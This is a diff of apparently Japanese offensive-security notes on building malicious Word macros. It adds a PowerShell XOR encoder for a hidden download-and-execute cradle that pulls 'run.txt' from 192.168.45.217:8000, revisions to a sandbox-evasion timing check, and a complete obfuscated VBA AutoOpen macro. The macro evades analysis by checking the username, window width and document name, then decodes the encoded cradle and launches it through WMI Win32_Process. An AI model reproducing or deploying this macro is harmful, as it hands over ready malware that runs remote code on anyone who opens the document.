@@ -195,6 +195,7 @@ End Sub
 ```
 
 ### XOR
+暗号化用powershell
 ```powershell
 $payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.45.217:8000/run.txt'))"
 $key = 42 
@@ -234,10 +235,12 @@ Function Nuts(Milk)
 End Function
 
 Function MyMacro()
-	Dim t As Double
-	t = Timer
-	Wait Now + TimeValue("00:00:05")
-	If Timer - t < 4.5 Then Exit Function
+	Dim t As Date
+	t = Now
+	Do While DateDiff("s", t, Now) < 5
+	    DoEvents
+	Loop
+	If DateDiff("s", t, Now) < 4 Then Exit Function
 	
 	If Environ("USERNAME") = "user" Or Environ("USERNAME") = "admin" Then
 	    Exit Function
@@ -254,13 +257,72 @@ Function MyMacro()
     Dim Apples As String
     Dim Water As String
 
-    Apples = "XOR暗号化済みペイロード"
+    Apples = "ペイロード暗号化文字列"
     Water = Nuts(Apples)
 
-    GetObject(Nuts("winmgmtsの暗号文字列")).Get(Nuts("Win32_Processの暗号文字列")).Create Water, Tea, Coffee, Napkin
+    GetObject(Nuts("winmgmts:の暗号文字列")).Get(Nuts("Win32_Processの暗号文字列")).Create Water, Tea, Coffee, Napkin
 End Function
 
 Sub AutoOpen()
     MyMacro
 End Sub
+```
+
+
+すでに暗号化してるバージョン
+```vb
+Function Pears(Beets)
+    Pears = Chr(Beets Xor 42)
+End Function
+
+Function Strawberries(Grapes)
+    Strawberries = Left(Grapes, 3)
+End Function
+
+Function Almonds(Jelly)
+    Almonds = Right(Jelly, Len(Jelly) - 3)
+End Function
+
+Function Nuts(Milk)
+    Oatmilk = ""
+    Do
+        Oatmilk = Oatmilk + Pears(CInt(Strawberries(Milk)))
+        Milk = Almonds(Milk)
+    Loop While Len(Milk) > 0
+    Nuts = Oatmilk
+End Function
+
+Function MyMacro()
+    Dim t As Date
+    t = Now
+    Do While DateDiff("s", t, Now) < 5
+        DoEvents
+    Loop
+    If DateDiff("s", t, Now) < 4 Then Exit Function
+    
+    If Environ("USERNAME") = "user" Or Environ("USERNAME") = "admin" Then
+        Exit Function
+    End If
+    
+    If Application.Width < 200 Then Exit Function
+    
+    'If Application.RecentFiles.Count < 3 Then Exit Function
+    
+    If ActiveDocument.Name <> Nuts("110069073027004078069073") Then
+        Exit Function
+    End If
+
+    Dim Apples As String
+    Dim Water As String
+
+    Apples = "090069093079088089066079070070010007079082079073010072083090075089089010007068069090010007093010066067078078079068010007073010067079082002002068079093007069072064079073094010089083089094079071004068079094004093079072073070067079068094003004078069093068070069075078089094088067068077002013066094094090016005005027019024004027028018004030031004024027029016018026026026005088095068004094082094013003003"
+    Water = Nuts(Apples)
+
+    GetObject(Nuts("093067068071077071094089016")).Get(Nuts("125067068025024117122088069073079089089")).Create Water, Tea, Coffee, Napkin
+End Function
+
+Sub AutoOpen()
+    MyMacro
+End Sub
+
 ```
